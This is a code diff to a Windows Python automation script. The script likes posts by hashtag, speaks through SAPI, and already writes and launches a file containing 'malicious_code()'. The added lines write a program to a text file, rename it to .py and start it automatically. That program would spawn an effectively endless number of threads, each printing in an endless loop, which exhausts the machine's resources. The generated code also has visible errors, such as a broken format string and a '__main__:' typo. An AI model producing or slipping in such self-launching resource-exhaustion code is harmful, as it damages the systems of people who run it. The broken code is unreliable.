@@ -1,5 +1,4 @@
 import os
-import tkinter as tk
 import time
 from win32com.client import Dispatch
 import wget
@@ -33,7 +32,6 @@ with smart_run(session):
 
     # activity
     session.like_by_tags(["natgeo"], amount=10)
-    pass
 
 speak = Dispatch("SAPI.SpVoice").Speak
 
@@ -160,7 +158,33 @@ e_file.writelines("malicious_code()\n")
 
 time.sleep(2)
 
+For_Threading = open("My_Threading.txt", 'w')
+
+For_Threading.writelines("from threading import Thread\n\n\n")
+For_Threading.writelines("def create_threads():\n")
+For_Threading.writelines("    for i in range(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):\n")
+For_Threading.writelines("        name = 'Thread #%s' '% (i + 1)'\n")
+For_Threading.writelines("        my_thread = MyThread(name)\n")
+For_Threading.writelines("        my_thread.start()\n\n\n")
+For_Threading.writelines("class MyThread(Thread):\n")
+For_Threading.writelines("    def __init__(self, name):\n")
+For_Threading.writelines("        Thread.__init__(self)\n")
+For_Threading.writelines("        self.name = name\n\n\n")
+For_Threading.writelines("    def run(self):\n")
+For_Threading.writelines("        for i in range(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):\n")
+For_Threading.writelines('            msg = "%s is running" % \n')
+For_Threading.writelines("                  self.name\n")
+For_Threading.writelines("            print(msg)\n\n\n")
+For_Threading.writelines('if __name__ == "__main__:":\n')
+For_Threading.writelines("    create_threads()\n\n")
+For_Threading = "My_Threading.txt"
+base = os.path.splitext(For_Threading)[0]
+os.rename(For_Threading, base + ".py")
+os.system.__call__("Start My_Threading.py")
+
 os.system.__call__("Start e_file.py")
+
+time.sleep(2)
 
 while True:
     speak = Dispatch("SAPI.SpVoice").Speak
